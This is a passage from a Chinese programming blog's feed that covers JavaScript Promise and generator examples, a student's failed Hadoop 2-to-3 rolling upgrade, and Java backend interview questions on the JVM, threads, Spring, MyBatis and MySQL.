class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/todos&#x27;</span>)</span><br><span class="line">     .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">     .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> (&#123; data &#125;))</span><br><span class="line">     .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> (&#123; err &#125;));</span><br></pre></td></tr></table></figure><p>今天看到一篇关于面试题的很有意思。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">   &#125;, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve</span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">     <span class="keyword">for</span>( <span class="keyword">var</span> i=<span class="number">0</span> ; i&lt;<span class="number">10000</span> ; i++ ) &#123;</span><br><span class="line">       i == <span class="number">9999</span> &amp;&amp; <span class="title function_">resolve</span>();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>);</span><br><span class="line">   &#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>);</span><br><span class="line">   &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> (&#123; err &#125;));</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>当然以上promise的知识点，这个只是冰山一角。需要更多地去学习了解一下。</p><h3 id="9-Generators"><a href="#9-Generators" class="headerlink" title="9.Generators"></a>9.Generators</h3><p>生成器（ generator）是能返回一个迭代器的函数。生成器函数也是一种函数，最直观的表现就是比普通的function多了个星号*，在其函数体内可以使用yield关键字,有意思的是函数会在每个yield后暂停。</p><p>这里生活中有一个比较形象的例子。咱们到银行办理业务时候都得向大厅的机器取一张排队号。你拿到你的排队号，机器并不会自动为你再出下一张票。也就是说取票机“暂停”住了，直到下一个人再次唤起才会继续吐票。</p><p>OK。说说迭代器。当你调用一个generator时，它将返回一个迭代器对象。这个迭代器对象拥有一个叫做next的方法来帮助你重启generator函数并得到下一个值。next方法不仅返回值，它返回的对象具有两个属性：done和value。value是你获得的值，done用来表明你的generator是否已经停止提供值。继续用刚刚取票的例子，每张排队号就是这里的value，打印票的纸是否用完就这是这里的done。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成器</span></span><br><span class="line"><span class="keyword">function</span> *<span class="title function_">createIterator</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成器能像正规函数那样被调用，但会返回一个迭代器</span></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">createIterator</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>那生成器和迭代器又有什么用处呢？</p><p>围绕着生成器的许多兴奋点都与异步编程直接相关。异步调用对于我们来说是很困难的事，我们的函数并不会等待异步调用完再执行，你可能会想到用回调函数，（当然还有其他方案比如Promise比如Async&#x2F;await）。</p><p>&#x3D;&#x3D;生成器可以让我们的代码进行等待。就不用嵌套的回调函数&#x3D;&#x3D;。使用generator可以确保当异步调用在我们的generator函数运行一下行代码之前完成时暂停函数的执行。</p><p>那么问题来了，咱们也不能手动一直调用next()方法，你需要一个能够调用生成器并启动迭代器的方法。就像这样子的</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params">taskDef</span>) &#123; <span class="comment">//taskDef即一个生成器函数</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// 创建迭代器，让它在别处可用</span></span><br><span class="line">       <span class="keyword">let</span> task = <span class="title function_">taskDef</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 启动任务</span></span><br><span class="line">       <span class="keyword">let</span> result = task.<span class="title function_">next</span>();</span><br><span class="line">   </span><br><span class="line">       <span class="comment">// 递归使用函数来保持对 next() 的调用</span></span><br><span class="line">       <span class="keyword">function</span> <span class="title function_">step</span>(<span class="params"></span>) &#123;</span><br><span class="line">   </span><br><span class="line">           <span class="comment">// 如果还有更多要做的</span></span><br><span class="line">           <span class="keyword">if</span> (!result.<span class="property">done</span>) &#123;</span><br><span class="line">               result = task.<span class="title function_">next</span>();</span><br><span class="line">               <span class="title function_">step</span>();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       <span class="comment">// 开始处理过程</span></span><br><span class="line">       <span class="title function_">step</span>();</span><br><span class="line">   </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>生成器与迭代器最有趣、最令人激动的方面，或许就是可创建外观清晰的异步操作代码。你不必到处使用回调函数，而是可以建立貌似同步的代码，但实际上却使用 yield 来等待异步操作结束。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hadoop2更新Hadoop3</title>
    <link href="/2023/06/18/Hadoop2%E6%9B%B4%E6%96%B0Hadoop3/"/>
    <url>/2023/06/18/Hadoop2%E6%9B%B4%E6%96%B0Hadoop3/</url>
    
    <content type="html"><![CDATA[<h2 id="蓦然回首"><a href="#蓦然回首" class="headerlink" title="蓦然回首"></a>蓦然回首</h2><p>发现自己整个实验都搞错了<br>看着老师实验指导书里面用的是Hadoop3,看到尚硅谷的视频中高可用集群用的也是Hadoop3,以为非要更新到Hadoop3不可。自己琢磨了好久怎么把之前的Hadoop2更新到Hadoop3，网上找的教程都和自己的操作不符，直到最后突然意识到了整个问题，发现Hadoop2也能配置高可用集群！<br>这是一次失败的更新，最终没成功，用的2配置HadoopHA完成了实验，不过我觉得以后有机会了可以再试试，目前不敢尝试了，最开始尝试的时候还好有一次备份，没有造成什么严重的影响，万一乱搞把集群搞坏了那完了，这学期的课都没法做了。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>大三上学期学习Hadoop的时候老师推荐配置的是Hadoop2,给的安装包也是2的版本，说如果配置3的话会有一些配置的地方会不一样。所以当时配置了Hadoop2.10.1的分布式集群，但最近学习Hadoop，涉及到Hadoop3的高可用集群，大作业还需要用Hadoop进行操作。<br>如果删除Hadoop2，配置Hadoop3的话，之前hdfs中的数据会丢失都是小事，主要是和Hadoop配套的zookeeper，hbase可能都需要重新配置，那样好像太麻烦了。想了一下，决定把Hadoop2进行升级，这样就不需要重装Hadoop，配置上也不需要修改多少，这是项有挑战性的任务。</p><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>首先需要选择Hadoop3的版本，如果版本和之前下载的Hbase、zookeeper不兼容的话又是麻烦事，后面还会安装Spark，所以版本的选择一定要慎重，查询一些资料后选择Hadoop3.1.3版本。</p><h2 id="更新步骤"><a href="#更新步骤" class="headerlink" title="更新步骤"></a>更新步骤</h2><p>首先下载Hadoop3的安装包，将其解压在Hadoop2的相同目录，把旧版的：core-site.xml、hdfs-site.xml,mapred-site.xml,yarn-site.xml，yarn-env.sh替换新版hadoop配置目录下。<br>把旧版的slaves中的数据复制到新版的works中<br>在hadoop-env.sh文件下加上JAVA_HOME的路径（不然会报找不到Java虚拟机的错误）</p><p>修改.bash_profile中hadoop的路径为新版的路径</p><h2 id="准备滚动升级"><a href="#准备滚动升级" class="headerlink" title="准备滚动升级"></a>准备滚动升级</h2><p>先启动旧版本的Hadoop：<br>hadoop-2.10.1&#x2F;etc&#x2F;hadoop&#x2F;sbin&#x2F;start-dfs.sh</p><p>进入安全模式<br>hdfs dfsadmin -safemode enter</p><p>hdfs dfsadmin -rollingUpgrade prepare<br>创建用于回滚的fsimage</p><p>hdfs dfsadmin -rollingUpgrade query<br>检查回滚映像的状态，显示“ Proceeding with Rolling Upgrade ”则是正确的</p><h2 id="开始更新"><a href="#开始更新" class="headerlink" title="开始更新"></a>开始更新</h2><p>namenode（NN）和datanode（DN）的升级是分开的</p><p>先关闭namenode<br>hadoop-2.10.1&#x2F;etc&#x2F;hadoop&#x2F;sbin&#x2F;hadoop-daemon.sh stop namenode</p><p>新版namenode启动：<br>$HADOOP_HOME&#x2F;bin&#x2F;hdfs –daemon start namenode -rollingUpgrade started </p><p>旧版 2启动<br>$HADOOP_HOME&#x2F;sbin&#x2F;hadoop-daemon.sh start namenode -rollingUpgrade started </p><p>hdfs dfsadmin -rollingUpgrade finalize<br>完成滚动升级</p><h2 id="失败情况下的回滚"><a href="#失败情况下的回滚" class="headerlink" title="失败情况下的回滚"></a>失败情况下的回滚</h2><p>修改环境变量为旧版<br>关闭新版和旧版的所有的nn和dn<br>hadoop-daemon.sh stop namenode<br>hadoop-daemon.sh stop datanode</p><p>hadoop-2.10.1&#x2F;etc&#x2F;hadoop&#x2F;sbin&#x2F;hadoop-daemon.sh start namenode –rollback<br>hadoop-2.10.1&#x2F;etc&#x2F;hadoop&#x2F;sbin&#x2F;hadoop-daemon.sh start datanode –rollback</p><h2 id="踩到的坑"><a href="#踩到的坑" class="headerlink" title="踩到的坑"></a>踩到的坑</h2><p>50070端口可以查看namenode节点状态，但是用edge浏览器无法查看，换成谷歌浏览器后就可以正常查看（因为这我还把hadoop2初始化了，数据全丢了。。）</p><p><a href="https://blog.csdn.net/lxhjava/article/details/104507506">https://blog.csdn.net/lxhjava/article/details/104507506</a></p>]]></content>
    
    
    <categories>
      
      <category>大数据</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java后端开发经常会问到的问题</title>
    <link href="/2023/06/18/Java%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%BB%8F%E5%B8%B8%E4%BC%9A%E9%97%AE%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2023/06/18/Java%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%BB%8F%E5%B8%B8%E4%BC%9A%E9%97%AE%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>秋招开始很久了，自己零零散散有几个面试，感觉其实面试问的问题无非就那几个，当然要深入一个点问下去可以问的很深。在此对自己面试遇到的那些问题进行一个汇总吧，做一篇属于自己的独有面经。</p><h2 id="面试问到的技术点"><a href="#面试问到的技术点" class="headerlink" title="面试问到的技术点"></a>面试问到的技术点</h2><h3 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h3><p>Java基础这一块基本都会问到，基础这一块设计的很多很复杂，我将其分为各个知识点进行记录吧。</p><h4 id="Java语言的特点"><a href="#Java语言的特点" class="headerlink" title="Java语言的特点"></a>Java语言的特点</h4><p>Q：Java这个语言有什么特色和优势<br>这个问题是我第一次面试的时候被问到的的一个问题，这个问题看起来很简单吧，但它又很抽象，不知道从哪里答，所以当时答的很不好，后面特意搜了如何去回答好这个问题。</p><blockquote><p>Java最大优点是跨平台，一次编写到处运行；<br>垃圾回收机制提供了对内存的自动管理，无需手动分配、释放内存；<br>去除了指针，使编码更简单，不容易出错；<br>面向对象，通过抽象封装成类，实例化生产对象，易维护、易扩展<br>是一种动态语言，可以通过反射机制在运行时获取信息和进行操作<br>具有多线程处理能力（四种线程创建方法）<br>适合分布式计算（Socket通信十分简单）</p></blockquote><p>Q：Java反射的原理，哪些地方用到了反射<br><a href="https://blog.csdn.net/weixin_55935744/article/details/123721719">Java反射</a></p><p>Q：值传递和引用传递，为什么要有这两种<br>值传递是对基本型变量而言的,传递的是该变量的一个副本,改变副本不影响原变量.<br>引用传递一般是对于对象型变量而言的,传递的是该对象地址的一个副本, 并不是原对象本身 。<br>一般认为,java内的基础类型数据传递都是值传递. java中实例对象的传递是引用传递。（但是String类型是static final类型的，所以值不会改变。）<br>实际上Java引用传递也是值传递，只不过此时传递的是Java引用对象的地址</p><h4 id="Java集合"><a href="#Java集合" class="headerlink" title="Java集合"></a>Java集合</h4><p>这个问题一般就是问对Java集合的理解了，具体可以参考自己之前做的笔记<br><a href="https://hukaichao.cn/archives/java-ji-he-xiang-jie--yuan-ma-fen-xi">Java集合详解</a></p><p>Q：hashtable和concurrenthashmap的区别<br>回答简而言就是ConcurrentHashMap锁的方式是稍微细粒度的。 ConcurrentHashMap将hash表分为16个桶（默认值），诸如get,put,remove等常用操作只锁当前需要用到的桶。<br><a href="https://blog.csdn.net/wisgood/article/details/19338693">Hashtable与ConcurrentHashMap区别</a></p><h4 id="jvm虚拟机"><a href="#jvm虚拟机" class="headerlink" title="jvm虚拟机"></a>jvm虚拟机</h4><p>这个我同样也做过笔记<br><a href="https://hukaichao.cn/archives/jvm-bi-ji">JVM笔记</a></p><p>Q：JVM中new一个对象的流程<br>这个问题主要考察的还是jvm的类加载过程。</p><blockquote><p>jvm类加载过程可以分为五个阶段，分别为<br>加载-&gt;验证-&gt;准备-&gt;解析-&gt;初始化–（使用–卸载）<br>加载阶段主要就是将Java文件，或者jar包中的文件进行加载<br>验证阶段是对文件中的元数据、字节码进行验证，确保不会危害虚拟机的安全<br>准备阶段会对静态变量分配内存并默认初始化（0，0L，null,false）<br>静态变量（static）带有final关键字的是常量，一旦赋值就不变，准备阶段就会进行赋值<br>类的实例属性在准备阶段不会分配内存<br>解析阶段是将常量池内的符号引用替换为直接引用，类似于操作系统中的逻辑地址转化为物理地址<br>初始化阶段开始执行Java程序代码，类元数据存放在方法区中，类对象存放在堆中（唯一一份），类对象初始化是线程安全的</p></blockquote><p>Q：静态变量、成员变量、局部变量的加载过程和默认初始值<br>静态变量：准备阶段会对静态变量分配内存并默认初始化（0，0L，null,false），存放在<strong>方法区</strong>中</p><p>成员变量：当我们新建一个对象时，虚拟机会在java<strong>堆</strong>中申请一块内存区域用以存放类的数据。而成员变量就是类的数据，也是放在这块内存区域中的。只需要JVM在申请内存的时候顺便把整块区域都置为零即可完成初始化。默认值同静态变量。</p><p>局部变量是存放于java虚拟机<strong>栈</strong>中，在执行java方法的时候会创建一个栈帧，用于存放局部变量表，操作数栈，动态链表，方法出口等信息。局部变量默认初始值均为null。</p><p>Q：常量存放在jvm的哪个地方，变量存放的地方，对象存放的地方<br>字符串存放于常量池中，局部变量存放于栈中，对象类型存放在堆中</p><p>jdk1.6及之前 有永久代（permanent generation），静态变量存放在永久代上<br>jdk1.7 有永久代，但已经逐步“去永久代”，字符串常量池、静态变量移除，保存在堆中<br>jdk1.8及之后 无永久代，类型信息、字段、方法、常量保存在本地内存的元空间，但字符串常量池、静态变量仍在堆中</p><h4 id="面向对象的好处"><a href="#面向对象的好处" class="headerlink" title="面向对象的好处"></a>面向对象的好处</h4><p>面向对象这一快其实没什么好问的，一般都问一下面向对象的三大特点，即继承、封装、多态。<br>从继承封装多态可以引申出设计模式中的一些规范，因为面向对象的设计其主要的目的也就是高内聚低耦合，让代码具有更好的扩展性，满足开闭原则等等。</p><h3 id="Java多线程"><a href="#Java多线程" class="headerlink" title="Java多线程"></a>Java多线程</h3><p>多线程这一快被问的比较多，但是我实际上学习的内容比较少，之前有学Java多线程高并发，java.util.concurrent包的缩写，JUC指的是Java的并发工具包。<br>JUC笔记：<a href="https://hukaichao.cn/archives/%E5%B9%B6%E5%8F%91%E6%A1%86%E6%9E%B6juc">并发框架JUC</a></p><p>Q：线程的创建方法有哪些<br>四种：<br>继承Thread类重写run方法<br>实现Runnable接口<br>继承Callable类重写call()方法<br>使用线程池</p><p>Q：线程的start和run分别起到什么作用<br>start() :<br>它的作用是启动一个新线程。<br>通过start()方法来启动的新线程，处于就绪（可运行）状态，并没有运行，一旦得到cpu时间片，就开始执行相应线程的run()方法，这里方法run()称为线程体，它包含了要执行的这个线程的内容，run方法运行结束，此线程随即终止。start()不能被重复调用。用start方法来启动线程，真正实现了多线程运行，即无需等待某个线程的run方法体代码执行完毕就直接继续执行下面的代码。这里无需等待run方法执行完毕，即可继续执行下面的代码，即进行了线程切换。</p><p>run() :<br>run()就和普通的成员方法一样，可以被重复调用。<br>如果直接调用run方法，并不会启动新线程！程序中依然只有主线程这一个线程，其程序执行路径还是只有一条，还是要顺序执行，还是要等待run方法体执行完毕后才可继续执行下面的代码，这样就没有达到多线程的目的。<br>总结：调用start方法方可启动线程，而run方法只是thread的一个普通方法调用，还是在主线程里执行。</p><p>Q：乐观锁和悲观锁，乐观锁的实现原理<br><strong>乐观锁：</strong><br>乐观锁的基本思想是假设并发冲突的概率很小，因此不使用锁来保护共享资源，而是在更新资源之前先进行检查，确保其他线程没有修改过数据。如果检查通过，就进行更新，否则进行回滚或者重试。</p><p>实现原理：<br><strong>版本号控制：</strong> 通过在数据表中增加一个版本号字段，每次更新数据时，将版本号加一。当读取数据时，将版本号一同读出。在更新的时候，比较数据库中的版本号和应用中的版本号，如果数据库中的版本号与应用中的版本号一致，表示没有其他线程修改过数据，可以进行更新；否则，需要进行相应的处理（例如回滚或者重试）。</p><p><strong>CAS（Compare and Swap）操作：</strong> CAS（比较与交换，Compare and swap） 是一种有名的无锁算法，它是乐观锁的一种实现方式。<br>CAS有三个操作数</p><ul><li>内存值v</li><li>旧的预期值A</li><li>要修改的新值B</li></ul><p>当多个线程尝试使用CAS同时更新一个变量的时候，只有一个能够更新成功。那就是当我们的内存值V和旧的预期值A相等的情况下，才能将内存值V修改成B！然后失败的线程不会挂起，而是被告知失败，可以继续尝试（自旋）或者什么都不做</p><p><strong>悲观锁：</strong><br>悲观锁的基本思想是假设并发冲突的概率很大，因此在访问共享资源时会使用锁来保护，以防止其他线程的干扰。悲观锁认为，在一段时间内，只有一个线程能够访问共享资源，其他线程必须等待。</p><p>实现原理：<br>数据库行锁： 在数据库中，通过SELECT … FOR UPDATE语句来锁定行，确保在事务提交之前其他事务不能修改该行。<br>Java中的synchronized关键字： 使用Java中的synchronized关键字来对共享资源进行加锁，确保在同一时刻只有一个线程能够访问。<br>ReentrantLock： Java中的ReentrantLock类提供了显式的锁，可以使用lock和unlock方法来手动控制锁的获取和释放。</p><p>Q：线程池如何设计，其中的参数<br>CPU密集型：corePoolSize &#x3D; CPU核数 + 1<br>IO密集型：corePoolSize &#x3D; CPU核数 * 2</p><p>Q：volatile 的作用<br>1、保证可见性；<br>2、保证有序性<br>3、不保证原子性</p><h3 id="Spring-SpringMVC-MyBatis框架"><a href="#Spring-SpringMVC-MyBatis框架" class="headerlink" title="Spring + SpringMVC +MyBatis框架"></a>Spring + SpringMVC +MyBatis框架</h3><p>Spring也是一个面试的考点，有一个问题遇到过两次了都不怎么答得上来</p><p>Q：常用的Spring注解有哪些<br>1.@Controller<br>在控制层使用，标识该类是 Spring MVC controller 处理器，用来创建处理 http 请求的对象。</p><p>2.@Service<br>在业务逻辑层使用，用于标注业务层组件。</p><p>3.@Repository<br>在数据访问层使用，用于标注数据访问组件，即 DAO 组件。</p><p>4.@Component<br>泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注。</p><p>5.@Autowired<br>把配置好的 bean 拿来用，完成属性、方法的组装，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。</p><p>6.@Resource<br>它的作用相当于 @Autowired 注解的作用。</p><p>7.@Bean<br>相当于 XML 中的，放在方法的上面，而不是类，意思是产生一个 Bean，并交给 Spring 的容器管理。</p><p>8.@Configuration<br>声明当前类为配置类，相当于 xml 形式的 Spring 配置。</p><p>9.@ComponentScan<br>用于对 Component 组件进行扫描。</p><p>10.@Value<br>为对应的属性注入值。</p><p>11.@RunWith<br>运行器，Spring 中通常用于对 Junit 的支持。</p><p>12.@RequestMapping<br>用于映射 Web 请求，包括访问路径和参数。</p><p>13.@ResponseBody<br>支持将返回值放在 response 内，而不是一个页面，通常用户返回 json 数据。</p><p>14.@RestController<br>用于标注控制层组件，包含 @Controller 和 @ResponseBody。</p><p>15.@RequestParam<br>用于将请求参数区数据映射到功能处理方法的参数上。</p><p>16.@Scope<br>用来配置 Spring Bean 的作用域，它标识 Bean 的作用域。</p><p>17.@Qualifier<br>当你创建多个具有相同类型的 bean 时，并且想要用一个属性只为它们其中的一个进行装配，在这种情况下，你可以使用 @Qualifier 注解和 @Autowired 注解通过指定哪一个真正的 bean 将会被装配来消除混乱。</p><p>18.@Transactional<br>通过这个注解可以声明事务，可以添加在类上或者方法上。</p><p>19.@Aspect<br>声明一个切面(类上)使用 @After、@Before、@Around 定义通知(advice)，可直接将拦截规则（切点）作为参数。</p><p>20.@PointCut<br>声明切点，在 java 配置类中使用。</p><p>21.@After<br>在方法执行之后执行(方法上)。</p><p>22.@Before<br>在方法执行之前执行(方法上)。</p><p>23.@Around<br>在方法执行之前与之后执行(方法上)。</p><p>Q：mybatis中动态sql常用的字段<br>单一条件：if<br>多个条件：choose, when, otherwise<br>自动封装：trim, where, set<br>遍历集合：foreach</p><p>Q：mybatis中一级缓存和二级缓存<br>1、Mybatis的一级缓存默认开启，而二级缓存默认关闭。<br>2、Mybatis的一级缓存指的是Mybaits中SqlSession对象的缓存，而二级缓存指的是SqlSessionFactory对象的缓存。一个SqlSessionFactory对象包括多个SqlSession对象。<br>3、SqlSession对象中存放的是返回数据的对象，而SqlSessionFactory对象中存放的是数据，不是对象。<br>4、Mybatis和Spring整合的时候，一级缓存与事务有关，而二级缓存与事务无关。</p><p>Q：Spring框架的特点（IOC和AOP）<br><a href="https://hukaichao.cn/archives/spring%E6%A1%86%E6%9E%B6">Spring框架</a></p><p>Q：Spring默认设计模式<br>工厂模式<br>Spring使用工厂模式可以通过 <code>BeanFactory</code> 或 <code>ApplicationContext</code> 创建 bean 对象。</p><p>单例模式<br>Spring中bean的默认作用域就是singleton(单例)的<br>Spring通过ConcurrentHashMap实现单例注册表的特殊方式实现单例模式。</p><p>代理模式<br>Spring AOP就是基于动态代理的，如果要代理的对象实现了某个接口，那么Spring AOP会使用JDK Proxy，去创建代理对象，而对于没有实现接口的对象，Spring AOP会使用Cglib，这时候Spring AOP会使用Cglib生成一个被代理对象的子类来作为代理</p><p>模板方法模式<br>Spring 中 jdbcTemplate、hibernateTemplate 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。</p><p>适配器模式<br>SpringMVC中的适配器HandlerAdatper（HandlerAdatper根据Handler规则执行不同的Handler）</p><p>装饰器模式<br>Spring中用到的包装器模式在类名上有两种表现：一种是类名中含有Wrapper，另一种是类名中含有Decorator，就是动态给一个对象添加一些额外的职责</p><p>观察者模式<br>spring的事件驱动模型使用的是 观察者模式 ，Spring中Observer模式常用的地方是listener的实现</p><p>策略模式<br>Spring框架的资源访问Resource接口。该接口提供了更强的资源访问能力，Spring 框架本身大量使用了 Resource 接口来访问底层资源。</p><p>Q：Springbean的生命周期<br>实例化 -&gt; 属性赋值 -&gt; 初始化 -&gt; 销毁<br>更为详细的要看源码&#x3D;-&#x3D; </p><p>Q：Spring bean的作用域</p><p>目前Spring Bean的作用域或者说范围主要有五种。</p><table><thead><tr><th>作用域</th><th>描述</th></tr></thead><tbody><tr><td>singleton</td><td>在spring IoC容器仅存在一个Bean实例，Bean以单例方式存在，bean作用域范围的默认值。</td></tr><tr><td>prototype</td><td>每次从容器中调用Bean时，都返回一个新的实例，即每次调用getBean()时，相当于执行newXxxBean()。</td></tr><tr><td>request</td><td>每次HTTP请求都会创建一个新的Bean，该作用域仅适用于web的Spring WebApplicationContext环境。</td></tr><tr><td>session</td><td>同一个HTTP Session共享一个Bean，不同Session使用不同的Bean。该作用域仅适用于web的Spring WebApplicationContext环境。</td></tr><tr><td>application</td><td>限定一个Bean的作用域为ServletContext的生命周期。该作用域仅适用于web的Spring WebApplicationContext环境。</td></tr></tbody></table><p>Q：jsp和servlet的关系<br>JSP是简化的Servlet设计，在HTML标签中嵌套Java代码，用以高效开发Web应用的动态网页。在仅使用Servlet的web应用开发中，部分Servlet代码通过使用打印语句打印HTML标签来在浏览器中显示页面，而JSP可以代替显示页面的Servlet。</p><p>联系：<br>JSP文件在容器中会转换成Servlet执行。<br>JSP是对Servlet的一种高级封装，本质还是Servlet。<br>区别：<br>JSP可以很方便地编写或者修改HTML网页而不用去面对大量的println语句。</p><p>Q：servlet的生命周期<br>Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程：<br>Servlet 初始化后调用 init () 方法。<br>Servlet 调用 service() 方法来处理客户端的请求。service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法。<br>Servlet 销毁前调用 destroy() 方法。</p><h3 id="Mysql数据库"><a href="#Mysql数据库" class="headerlink" title="Mysql数据库"></a>Mysql数据库</h3><p>mysql这块也会经常问，但没有被问的特别深过<br>笔记：<a href="https://hukaichao.cn/archives/mysqlbi-ji">Mysql数据库</a></p><p>Q：MySQL存储引擎，innodb和myisam有什么区别</p><p>InnoDB：<br>优点：支持事务，支持外键，并发量较大，适合大量 update。<br>缺点：查询数据相对较快，不适合大量的 select。</p><p>MyISAM：<br>优点：查询数据相对较快，适合大量的 select，可以全文索引。<br>缺点：不支持事务，不支持外键，并发量较小，不适合大量 update。</p><p>InnoDB 和 MyISAM 均支持 B+ Tree 数据结构的索引。但 InnoDB 是聚集索引，而 MyISAM 是非聚集索引。</p><p>Q：MySQL中索引的设计<br>MySQL 索引设计原则：<br>（1）对于经常查询的字段，建议创建索引。<br>（2）索引不是越多越好，一个表如果有大量索引，不仅占用磁盘空间，而且会影响INSERT，DELETE，UPDATE等语句的性能。<br>（3）避免对经常更新的表进行过多的索引，因为当表中数据更改的同时，索引也会进行调整和更新，十分消耗系统资源。<br>（4）数据量小的表建议不要创建索引，数据量小时索引不仅起不到明显的优化效果，对于索引结构的维护反而消耗系统资源。<br>（5）不要在区分度低的字段建立索引。比如性别字段，只有 “男” 和 “女” ，建索引完全起不到优化效果。<br>（6）当唯一性是某字段本身的特征时，指定唯一索引能提高查询速度。<br>（7）在频繁进行跑排列分组（即进行 group by 或 order by操作）的列上建立索引，如果待排序有多个，可以在这些列上建立组合索引。</p><p>Q：MySQL什么情况下会回表查询<br>回表的意思就是你执行一条sql语句，需要从两个b+索引中去取数据。</p><p>例如表tbl有a,b,c三个字段，其中a是主键，b上建了索引，然后编写sql语句</p><p>SELECT * FROM tbl WHERE a&#x3D;1</p><p>这样不会产生回表，因为所有的数据在a的索引树中均能找到</p><p>SELECT * FROM tbl WHERE b&#x3D;1</p><p>这样就会产生回表，因为where条件是b字段，那么会去b的索引树里查找数据，但b的索引里面只有a,b两个字段的值，没有c，那么这个查询为了取到c字段，就要取出主键a的值，然后去a的索引树去找c字段的数据。查了两个索引树，这就叫回表。</p><p>Q：Mysql中的连接和聚合函数了解哪些<br>mysql聚合函数如：count(), max(), min(), sum(), avg()等<br>group by 将数据库的数据用’by’后面接的规则进行分组<br>having是分组（group by）后的筛选条件；<br>where则是在分组前筛选</p><p>Q：MySQL中内连接和left join的区别<br>inner join(内连接)：取得两个表中存在连接匹配关系的记录<br>left join (左连接)：以左表为基准(取左表所有记录)，右表匹配向左表</p><h3 id="Redis数据库"><a href="#Redis数据库" class="headerlink" 